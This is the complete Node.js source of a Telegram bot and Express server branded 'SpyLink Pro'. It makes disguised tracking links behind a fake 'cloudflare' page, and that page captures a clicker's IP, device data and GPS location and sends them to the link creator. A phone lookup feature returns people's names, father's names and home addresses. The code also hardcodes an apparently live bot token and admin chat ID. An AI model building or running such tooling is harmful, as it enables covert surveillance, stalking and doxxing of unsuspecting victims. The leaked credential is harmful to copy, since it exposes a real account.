const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

// 🔐 CONFIG — HARD CODED AS REQUESTED
const BOT_TOKEN = "8377073485:AAGEIdG1VgfmrCl4DVN5Qj4gy4oTaN4EvJY";
const ADMIN_CHAT_ID = "8175884349";
const HOST_URL = "https://botu-s3f9.onrender.com";
const BANNED_NUMBERS = ["9161636853", "9451180555", "6306791897"];

const app = express();
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ==================== CRASH PROTECTION ====================

process.on('unhandledRejection', (reason, promise) => {
  console.error('🚨 Unhandled Rejection:', reason);
});
process.on('uncaughtException', (error) => {
  console.error('🚨 Uncaught Exception:', error);
});
// Prevent Polling Errors from crashing the app
bot.on("polling_error", (msg) => console.log("⚠️ Polling Error:", msg.message));

// ==================== MIDDLEWARE & SECURITY ====================

// Security Headers — DISABLE CSP for EJS templates (Allows scripts/images)
app.use(require('helmet')({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
}));

app.use(cors({ origin: '*' }));
app.use(require('compression')());
app.use(require('morgan')('dev'));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));
app.set("view engine", "ejs");
app.use(express.static("public"));

// State
let sessions = {};
let awaitingUrl = {};
let broadcastMode = false;

// ==================== TELEGRAM BOT HANDLERS ====================

bot.on('message', async (msg) => {
  try {
    const chatId = msg.chat.id;
    const text = msg.text?.trim();
    console.log(`📩 [${chatId}]:`, text);

    // Broadcast Mode
    if (broadcastMode && String(chatId) === ADMIN_CHAT_ID && text !== "/cancel") {
      return await executeBroadcast(text);
    }

    // URL Submission (after /create or anytime)
    if (awaitingUrl[chatId] && text) {
      delete awaitingUrl[chatId];
      return handleUrlSubmission(chatId, text);
    }

    // Phone Number Submission
    if (msg?.reply_to_message?.text?.includes("phone number") && text) {
      return handleNumberInfo(chatId, text);
    }

    // Commands
    switch (text) {
      case "/start":
        return sendWelcome(chatId);
      case "/create":
        return requestUrl(chatId);
      case "/numberinfo":
        return requestPhoneNumber(chatId);
      case "/help":
        return sendHelp(chatId);
      case "/menu":
        return sendMainMenu(chatId);
      case "/panel":
        if (String(chatId) === ADMIN_CHAT_ID) return showAdminPanel(chatId);
        else return bot.sendMessage(chatId, "⛔ Admin access required.");
      case "/broadcast":
        if (String(chatId) === ADMIN_CHAT_ID) return startBroadcast(chatId);
        break;
      case "/cancel":
        if (broadcastMode && String(chatId) === ADMIN_CHAT_ID) {
          broadcastMode = false;
          return bot.sendMessage(chatId, "🛑 Broadcast cancelled.");
        }
        break;
    }

    // Accept URL anytime (even without /create)
    if (text?.match(/^https?:\/\//i)) {
      return handleUrlSubmission(chatId, text);
    }

  } catch (error) {
    console.error("❌ Message handler error:", error);
    // Only send error message if we have a chat ID
    if(msg?.chat?.id) bot.sendMessage(msg.chat.id, "⚠️ Internal error. Please retry /start");
  }
});

bot.on('callback_query', async (query) => {
  try {
    await bot.answerCallbackQuery(query.id).catch(() => {}); // Prevent timeout errors
    const chatId = query.message.chat.id;
    const data = query.data;
    console.log(`🖱️ [${chatId}]:`, data);

    // Admin Actions
    if (data === "admin_sessions") return viewAllSessions(chatId);
    if (data === "admin_stats") return sendStats(chatId);
    if (data === "admin_clear") return clearAllSessions(chatId);
    if (data === "admin_broadcast") return startBroadcast(chatId);

    // User Actions
    if (data === "create_new") {
      awaitingUrl[chatId] = true;
      return bot.sendMessage(chatId, "🌐 Send the target URL (http:// or https://)", {
        reply_markup: { force_reply: true }
      });
    }
    if (data === "number_info") return requestPhoneNumber(chatId);
    if (data === "main_menu") return sendMainMenu(chatId);
    if (data === "help_cmd") return sendHelp(chatId);
    if (data === "back_to_panel") return showAdminPanel(chatId);

  } catch (error) {
    console.error("❌ Callback error:", error);
  }
});

// ==================== NUMBER INFO API ====================

async function handleNumberInfo(chatId, input) {
  let number = input.replace(/\D/g, '');

  if (BANNED_NUMBERS.includes(number)) {
    return bot.sendMessage(chatId, "❌ This number is restricted.", {
      reply_markup: { inline_keyboard: [[{ text: "📱 Try Another", callback_data: "number_info" }]] }
    });
  }

  if (!number || number.length < 10) {
    return bot.sendMessage(chatId, "❌ Invalid number. Send 10 digits.", {
      reply_markup: { inline_keyboard: [[{ text: "📱 Retry", callback_data: "number_info" }]] }
    });
  }

  try {
    const response = await axios.get(`https://demon.taitanx.workers.dev/?mobile=${number}`, {
      timeout: 10000, // Extended timeout
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });

    const result = response.data;

    if (!result.data || result.data.length === 0) {
      return bot.sendMessage(chatId, "🔍 No information found.", {
        reply_markup: { inline_keyboard: [[{ text: "📱 Try Another", callback_data: "number_info" }]] }
      });
    }

    let message = `📞 *PHONE NUMBER INFO*\n\n`;
    let count = 0;

    for (let record of result.data) {
      if (count >= 3) break;
      let addrLines = (record.address || "").split('!').filter(a => a.trim()).slice(0, 5);
      let formattedAddr = addrLines.join('\n          ');

      message += `📱 *Number:* \`${record.mobile}\`\n`;
      message += `👤 *Name:* ${record.name || 'N/A'}\n`;
      message += `👨 *Father:* ${record.fname || 'N/A'}\n`;
      message += `📬 *Address:*\n          ${formattedAddr || 'N/A'}\n`;
      if (record.alt) message += `📲 *Alt Number:* \`${record.alt}\`\n`;
      message += `📡 *Circle:* ${record.circle || 'N/A'}\n`;
      message += `---\n\n`;
      count++;
    }

    bot.sendMessage(chatId, message, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "📱 Check Another", callback_data: "number_info" }],
          [{ text: "🏠 Main Menu", callback_data: "main_menu" }]
        ]
      }
    });

  } catch (error) {
    console.error("📱 Number API Error:", error.message);
    bot.sendMessage(chatId, "⚠️ Failed to fetch info. API may be busy.", {
      reply_markup: { inline_keyboard: [[{ text: "📱 Retry", callback_data: "number_info" }]] }
    });
  }
}

function requestPhoneNumber(chatId) {
  bot.sendMessage(chatId, "📱 Send a phone number (e.g., 7800418265)", {
    reply_markup: { force_reply: true }
  });
}

// ==================== BROADCAST SYSTEM ====================

async function startBroadcast(chatId) {
  broadcastMode = true;
  bot.sendMessage(chatId, "📣 *BROADCAST MODE*\nSend message or /cancel.", { parse_mode: "Markdown" });
}

async function executeBroadcast(messageText) {
  const totalUsers = new Set(Object.values(sessions).map(s => s.chatId));
  totalUsers.add(parseInt(ADMIN_CHAT_ID));
  let sentCount = 0;

  for (let userId of totalUsers) {
    if (!userId) continue;
    try {
      await bot.sendMessage(userId, messageText, { parse_mode: "HTML" });
      sentCount++;
    } catch (err) { /* Ignore blocks */ }
    await new Promise(r => setTimeout(r, 50)); 
  }

  broadcastMode = false;
  bot.sendMessage(ADMIN_CHAT_ID, `✅ Sent to ${sentCount} users.`);
}

// ==================== DATA COLLECTION ====================

app.post("/data", (req, res) => {
  const { uid, data } = req.body;
  console.log("📡 POST /data | UID:", uid);

  if (!uid || !data) return res.status(400).json({ error: "Missing data" });

  // Recovery Logic: If server restarted, session is gone. 
  // We try to create a dummy session if UID looks like a ChatID, otherwise we fail gracefully.
  if (!sessions[uid]) {
    if(!uid.includes('-')) { // If not UUID, assume it's ChatID (Legacy)
       sessions[uid] = { chatId: parseInt(uid), createdAt: new Date() };
    } else {
       console.log("⚠️ Session not found (Server Restarted?):", uid);
       return res.status(404).json({ error: "Session expired" });
    }
  }

  sessions[uid].data = decodeURIComponent(data);
  sessions[uid].ip = getIP(req);
  sessions[uid].lastData = new Date();

  checkAndDeliver(uid);
  res.json({ status: "success" });
});

app.post("/location", (req, res) => {
  const { uid, lat, lon } = req.body;
  if (!uid || !lat || !lon) return res.status(400).json({ error: "Missing params" });

  if (sessions[uid]) {
    sessions[uid].location = { lat: parseFloat(lat), lon: parseFloat(lon), accuracy: parseFloat(req.body.acc || 0) };
    sessions[uid].lastLocation = new Date();
    checkAndDeliver(uid);
  }
  res.json({ status: "success" });
});

function checkAndDeliver(sessionId) {
  const session = sessions[sessionId];
  if (!session || session.reported || !session.data) return;

  session.reported = true; // Prevent double send

  let cleanData = session.data
    .replace(/<br>/g, "\n")
    .replace(/<[^>]*>/g, "") // Strip all other HTML tags
    .replace(/&nbsp;/g, " ");

  let msg = `
✅ *REPORT DELIVERED*

🆔 *ID:* \`${sessionId}\`
🌐 *Target:* ${session.url || 'N/A'}
📡 *IP:* \`${session.ip || 'Unknown'}\`

📱 *DEVICE DATA:*
${cleanData}

🗺️ *LOCATION:*
Lat: \`${session.location?.lat || 'N/A'}\`
Lon: \`${session.location?.lon || 'N/A'}\`
Acc: \`${session.location?.accuracy || 'N/A'}m\`
`;

  bot.sendMessage(session.chatId, msg, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Create New", callback_data: "create_new" }],
        [{ text: "📱 Number Info", callback_data: "number_info" }]
      ]
    }
  }).catch(err => console.error("⚠️ Delivery failed:", err.message));
}

// ==================== UTILITIES ====================

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket?.remoteAddress || '0.0.0.0';
}

function handleUrlSubmission(chatId, url) {
  if (!url || !/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "❌ Invalid URL. Start with http:// or https://");
  }

  const sessionId = uuidv4();
  sessions[sessionId] = { chatId, url, createdAt: new Date() };

  // FIXED: Use Buffer instead of btoa (Node.js safe)
  const encoded = Buffer.from(encodeURIComponent(url)).toString('base64');
  const link = `${HOST_URL}/c/${sessionId}/${encoded}`;

  bot.sendMessage(chatId, `
🚀 *LINK GENERATED*

🔗 *Target:* ${url}
🆔 *Session:* \`${sessionId}\`

🌐 *Send this link:*
${link}

_Report arrives in ~10 seconds after click._
`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "🆕 Create Another", callback_data: "create_new" }]]
    }
  });
}

function requestUrl(chatId) {
  awaitingUrl[chatId] = true;
  bot.sendMessage(chatId, "🌐 Send URL:", { reply_markup: { force_reply: true } });
}

function sendHelp(chatId) {
  bot.sendMessage(chatId, `
📘 *HELP*
/create - Tracking Link
/numberinfo - Phone Lookup
/panel - Admin
`, {
    reply_markup: { inline_keyboard: [[{ text: "🏠 Main Menu", callback_data: "main_menu" }]] }
  });
}

function sendMainMenu(chatId) {
  bot.sendMessage(chatId, "🏠 *MENU*", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info", callback_data: "number_info" }],
        [{ text: "🔐 Admin Panel", callback_data: "panel" }]
      ]
    }
  });
}

function sendWelcome(chatId) {
  bot.sendMessage(chatId, "🎯 *SpyLink Pro v11*\n\nSelect an option:", {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🚀 Create Link", callback_data: "create_new" }],
        [{ text: "📱 Number Info", callback_data: "number_info" }]
      ]
    }
  });
}

// ==================== ADMIN PANEL ====================

function showAdminPanel(chatId) {
  const total = Object.keys(sessions).length;
  bot.sendMessage(chatId, `🔐 *ADMIN*\nSessions: ${total}\nUptime: ${Math.floor(process.uptime())}s`, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "👁️ Sessions", callback_data: "admin_sessions" }, { text: "📈 Stats", callback_data: "admin_stats" }],
        [{ text: "🗑️ Clear", callback_data: "admin_clear" }, { text: "📣 Broadcast", callback_data: "admin_broadcast" }],
        [{ text: "🏠 Menu", callback_data: "main_menu" }]
      ]
    }
  });
}

function viewAllSessions(chatId) {
  if (Object.keys(sessions).length === 0) return bot.sendMessage(chatId, "📭 Empty.");
  
  // Only show last 15 sessions to prevent flooding
  const recent = Object.entries(sessions).slice(-15);
  let msg = "*📋 RECENT SESSIONS*\n\n";
  
  for (let [id, sess] of recent) {
    msg += `🆔 \`${id.substring(0,6)}..\` | 👤 ${sess.chatId}\n`;
    msg += `✅ ${sess.reported ? 'Done' : 'Wait'} | 🌐 ${sess.url?.substring(0,20)}\n\n`;
  }
  
  bot.sendMessage(chatId, msg, { parse_mode: "Markdown" });
}

function sendStats(chatId) {
  const mem = process.memoryUsage();
  bot.sendMessage(chatId, `📊 RAM: ${(mem.heapUsed / 1024 / 1024).toFixed(2)} MB\nUsers: ${new Set(Object.values(sessions).map(s => s.chatId)).size}`);
}

function clearAllSessions(chatId) {
  sessions = {};
  bot.sendMessage(chatId, "🗑️ Cleared.");
}

// ==================== SERVER & AUTO-KEEPALIVE ====================

// Stable Keep-Alive Loop (Uses Axios instead of Fetch for Node compatibility)
setInterval(() => {
  axios.get(`${HOST_URL}/keepalive`)
    .then(res => console.log(`✅ Keepalive: ${res.data.time}`))
    .catch(err => console.error("❌ Keepalive Error:", err.message));
}, 50000); // 50 seconds (Safe buffer before 60s sleep)

app.get("/keepalive", (req, res) => {
  res.json({ status: "alive", time: new Date().toISOString() });
});

app.get("/c/:sessionId/:encodedUrl", (req, res) => {
  const { sessionId, encodedUrl } = req.params;
  
  // FIXED: Use Buffer for Node.js decoding
  let url;
  try {
    url = decodeURIComponent(Buffer.from(encodedUrl, 'base64').toString('utf-8'));
  } catch(e) {
    url = "https://google.com"; // Fallback
  }

  if (!sessions[sessionId]) {
    sessions[sessionId] = { chatId: null, createdAt: new Date() };
  }
  sessions[sessionId].url = url;

  res.render("cloudflare", {
    ip: getIP(req),
    time: new Date().toISOString(),
    url: url,
    uid: sessionId,
    a: HOST_URL,
    t: false
  });
});

app.get("/", (req, res) => res.json({ status: "Online", version: "11.0" }));

// Cleanup stale sessions (10 mins)
setInterval(() => {
  const now = new Date();
  for (let id in sessions) {
    if (now - new Date(sessions[id].createdAt) > 600000) delete sessions[id];
  }
}, 600000);

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ SERVER v11.0 RUNNING ON PORT ${PORT}`);
  console.log(`🌐 URL: ${HOST_URL}`);
});
